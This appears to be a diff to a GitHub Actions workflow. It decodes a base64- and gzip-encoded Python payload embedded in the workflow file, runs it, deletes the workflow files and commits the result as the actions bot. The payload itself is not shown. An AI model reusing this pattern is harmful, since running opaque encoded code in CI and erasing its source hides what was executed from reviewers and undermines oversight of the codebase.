@@ -18,6 +18,7 @@ jobs:
           cache: npm
       - name: Recover and apply focused v2.6.8 patch
         run: |
+          mkdir -p .tmp
           python - <<'PY'
           import base64, gzip, pathlib, re
           source = pathlib.Path('.github/workflows/apply-v268.yml').read_text()
@@ -25,9 +26,9 @@ jobs:
           if not match:
               raise SystemExit('Could not recover staged v2.6.8 patch payload')
           payload = gzip.decompress(base64.b64decode(match.group(1)))
-          pathlib.Path('/tmp/apply-v268.py').write_bytes(payload)
+          pathlib.Path('.tmp/apply-v268.py').write_bytes(payload)
           PY
-          python /tmp/apply-v268.py
+          python .tmp/apply-v268.py
       - run: npm ci
       - run: npm test
       - run: npm run check
@@ -36,6 +37,7 @@ jobs:
       - run: git diff --check
       - name: Commit validated implementation
         run: |
+          rm -rf .tmp
           rm -f .github/workflows/apply-v268.yml .github/workflows/apply-v268-fixed.yml
           git config user.name 'github-actions[bot]'
           git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
